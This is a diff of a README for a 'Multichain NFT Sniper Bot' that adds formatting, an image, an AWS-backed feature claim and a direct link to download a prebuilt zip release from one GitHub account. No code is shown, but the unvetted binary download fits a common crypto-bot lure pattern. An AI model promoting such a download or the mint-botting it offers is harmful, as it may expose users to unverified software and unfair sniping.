@@ -1,13 +1,18 @@
 
 # Multichain NFT Sniper Bot
 
-Fastest Multichain NFT Sniper Bot used for botting contracts on Polygon, Solana, Fantom, &amp; Avalanche!
+<b>Fastest Multichain NFT Sniper Bot used for botting contracts on Polygon, Solana, Fantom, &amp; Avalanche!</b>
+
+
+<img src="https://raw.githubusercontent.com/JackRussel77/Multichain-NFT-Sniper/main/1.3.7.PNG" width="350" height="350">
 
 
 
 
 ## Features
 
+
+- Extremely lighweight client (uses AWS servers to do majority of the heavy lifting)
 - Light/dark mode toggle
 - Blockchains supported: Ethereum, Polygon, Solana, Fantom, & Avalanche
 - Custom amount of NFTs to mint per address
@@ -18,18 +23,11 @@ Fastest Multichain NFT Sniper Bot used for botting contracts on Polygon, Solana,
 
 ## Installation
 
-Download the latest release below:
+<b><u>Download the latest release below:</b></u>
 
-Latest Version (v1.3.7)
-## FAQ
+<a href="https://github.com/JackRussel77/Multichain-NFT-Sniper/releases/download/multichain-nft-sniper/Multichain.NFT.Sniper.1.3.7.zip" title="Latest Version (v1.3.7)">Latest Version (v1.3.7)</a>
 
-#### Question 1
 
-Answer 1
-
-#### Question 2
-
-Answer 2
 
 
 ## Optimizations
